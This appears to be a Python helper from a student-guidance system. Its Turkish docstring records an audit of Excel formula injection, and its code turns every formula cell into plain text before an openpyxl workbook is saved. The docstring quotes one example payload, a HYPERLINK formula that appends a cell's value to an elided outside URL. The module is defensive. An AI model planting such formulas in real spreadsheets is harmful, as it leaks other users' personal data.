"""[2026-11-04] Güvenlik denetimi — Excel formül enjeksiyonu.

openpyxl "=" ile başlayan her metni formül hücresi olarak yazar. Öğrencinin kendi yazdığı alanlar (ad soyad, anket açık uçlu
cevabı, görüşme notu vb.) rehberin indirdiği Excel'e girdiğinde `=HYPERLINK("https://…?"&B2;"Tıkla")` gibi bir değer
çalışır ve diğer öğrencilerin verisini dışarı taşıyabilirdi. Sistem hiçbir Excel çıktısında bilerek formül üretmez; bu yüzden
kaydetmeden hemen önce her formül hücresi düz metne çevrilir (değer aynen görünür, çalışmaz). Tüm çıktılar `guvenli_kaydet`ten geçer.
"""
from __future__ import annotations


def formulleri_metne_cevir(wb) -> int:
    n = 0
    for ws in wb.worksheets:
        for satir in ws.iter_rows():
            for c in satir:
                if c.data_type == "f":
                    c.data_type = "s"
                    n += 1
    return n


def guvenli_kaydet(wb, hedef) -> None:
    formulleri_metne_cevir(wb)
    wb.save(hedef)
